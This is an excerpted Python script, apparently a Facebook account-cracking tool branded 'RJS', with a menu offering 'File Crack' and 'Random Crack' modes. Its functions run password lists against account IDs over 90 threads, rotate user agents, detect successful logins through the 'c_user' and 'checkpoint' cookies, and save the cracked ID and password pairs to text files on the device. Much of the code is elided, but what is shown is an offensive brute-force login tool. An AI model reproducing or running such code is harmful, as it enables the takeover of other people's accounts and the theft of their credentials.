...
os.system('xdg-open https://www.facebook.com/rafayxyzz');
logo=("""   \x1b[31m
########        ###  \033[92;1m     ##     ##    ######## 
##     ##      ## ##      ##     ##  \033[95;1m  ##       
##     ##     ##   ##     ##     ##    ##       
...
def Rauf():    
			print(logo)
			print('\x1b[1;91m>>> POWERED BY RAUF JARWAR SINDH:\x1b[1;92m  ')
			linex()
			print('[1] File Crack\n[2] Random Crack\n[3] Create File\n[4] Logout Cookie\n[5] Login Tool\n[F] Facebook Join\n[W] WhatsApp Join\n[0] Exit')
			linex()
			...
			if xd in ['1','01']:
				...
				with tred(max_workers=90) as crack_submit:
					os.system('clear')
					print(logo)
					print('\x1b[1;91m[*] If you no result Use Airplane Mode ')
					linex()
				...
				os.system('python RJS.py')
			elif xd in ['2','02']:
				menu()
			elif xd in ['3','03']:
				bd()
			elif xd in ['F','F']:
				os.system(f'xdg-open https://www.facebook.com/rafayxyzz');Rauf()
			elif xd in ['W','W']:
				os.system('xdg-open https://chat.whatsapp.com/EuyU4JRbcU89CWYw4ic6SQ');Rauf()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[RAUF / RJS] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[RJS-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/RJS-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SHAHBAZ:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[RJS-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/RJS-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[RAUF / RJS] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[RJS-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[RJS-CP] '+ids+' | '+pas+'\033[1;97m')
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mRAUF / RJS\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[RJS-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[RJS-OK] '+cid+' | '+ps+'\33[0;97m')
